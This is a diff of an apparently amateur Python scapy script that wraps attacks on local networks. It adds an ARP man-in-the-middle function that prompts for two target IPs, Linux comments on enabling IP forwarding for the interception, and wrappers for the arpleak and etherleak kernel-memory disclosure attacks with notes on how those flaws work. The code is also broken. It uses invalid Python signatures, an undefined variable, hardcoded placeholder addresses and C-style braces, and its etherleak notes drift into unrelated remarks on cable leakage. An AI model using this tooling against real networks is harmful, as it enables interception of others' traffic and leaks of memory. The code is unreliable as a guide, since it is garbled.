@@ -2,20 +2,30 @@
 from scapy.layers.l2 import Ether, ARP
 import scapy.all as scapy
 import time
-def attack(): 
-    scapy.layers.l2.arp_mitm(ip1: "0.0.0.0", ip2: "0.0.0.0", mac1: "ff-ff-ff-ff-ff-ff", mac2: "ff-ff-ff-ff-ff-ff",Boradcast: False, target_mac: "ff-ff-ff-ff-ff-ff", iface: "Ethernet2")
+def attack(str T1, str T2, str Attacker): 
+    #mac1 and mac2 are optional, will arp if not provided, broadcast makes broadcast default, target_mac is your MAC address- defaults to your interfaces one, iface is for the name of the network interface, defaults to route for ip1
 
+    scapy.layers.l2.arp_mitm("0.0.0.0", "0.0.0.0", "ff-ff-ff-ff-ff-ff", "ff-ff-ff-ff-ff-ff", False, "ff-ff-ff-ff-ff-ff", "Ethernet2")
+    #scapy.layers.l2.arp_mitm(ip1, ip2, mac1, mac2 ,Boradcast, target_mac, iface)
+
+#linux implementation: 
 #$ sysctl net.ipv4.conf.virbr0.send_redirects=0  # virbr0 = interface | default Send_redirects =1, virbr0- for Network Address resolution
 #$ sysctl net.ipv4.ip_forward=1 | default = 0
 #$ sudo scapy
 #>>> arp_mitm("192.168.122.156", "192.168.122.17")
 
 if __name__ == '__main__':
-scapy.layers.l2.getmacbyip(ip: str, chainCC: int = 0)→ str | None
-#mac1 and mac2 are optional, will arp if not provided, broadcast makes broadcast default, target_mac is your MAC address- defaults to your interfaces one, iface is for the name of the network interface, defaults to route for ip1
+    T1 = input("Enter Target1's IP Address")
+    T2 = input("Enter Target2's IP Address")
+    Mac1 = scapy.layers.l2.getmacbyip(T1, 0)
+    Mac2 = scapy.layers.l2.getmacbyip(T2, 0)
+    AMac = scapy.layers.l2.getmacbyip(Attacker, 0)
+    #scapy.layers.l2.getmacbyip("0.0.0.0", 0)
+    #scapy.layers.l2.getmacbyip(ip, chainCC) returns: str | None
 
 def ARP_Leak_Attack():
-    scapy.layers.l2.arpleak(target: str, plen: int = 255, hwlen: int = 255, **kargs: Any)→ Tuple[SndRcvList, PacketList]
+    scapy.layers.l2.arpleak("0.0.0.0", 255, 255, ...) #Values must be 255 for it to work
+#scapy.layers.l2.arpleak(target: str, plen, hwlen, **kargs) Returns: Tuple[SndRcvList, PacketList]
  # When replying to an ARP request, a particular branch taken in the
   # output code did not free the mbuf that was being sent. An attacker
    #could send specially-crafted ARP requests that trigger this memory
@@ -28,7 +38,13 @@ def ARP_Leak_Attack():
  #  demonstrated that a remote machine can thereby retrieve 249 bytes of
  #  kernel memory over an Ethernet link.
 def Ethernet_Leak_Attack():
-    scapy.layers.l2.etherleak(target: str, **kargs: Any)→ Tuple[SndRcvList, PacketList]
+    scapy.layers.l2.etherleak("0.0.0.0", ...)
+    #scapy.layers.l2.etherleak(target: str, **kargs) Returns: Tuple[SndRcvList, PacketList]
+#Etherleak is an information disclosure vulnerability that allows an attacker to view slices of previously transmitted packets or portions of kernel memory
+#This vulnerability arises when bytes used to pad an Ethernet frame to the minimum size are copied directly from a dirty buffer without being sanitized
+#It is a link layer implementation flaw in multiple platforms. Ethernet connection leakage current should be negligible with UTP, but if shielded cable is used, there will also be made a chassis connection between the two devices.
+#Cable signal leaks occur when the RF signals transmitted within a cable system are not properly contained.
+
 def promisc_mode()
 {
     #Promiscuous mode is a feature in computer networking that allows a network interface controller (NIC) or wireless network interface controller (WNIC) to capture all network traffic it receives, 
